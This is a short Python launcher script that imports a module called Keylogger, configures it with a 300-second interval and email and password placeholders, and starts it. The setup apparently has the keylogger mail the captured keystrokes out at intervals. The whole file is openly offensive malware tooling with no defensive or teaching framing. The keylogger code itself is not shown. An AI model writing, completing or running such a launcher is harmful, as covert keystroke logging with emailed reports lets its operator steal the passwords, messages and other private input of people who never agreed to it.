#!/usr/bin/env python

import Keylogger

keylogger_object = Keylogger.Keylogger(300, "email", "password")

keylogger_object.start()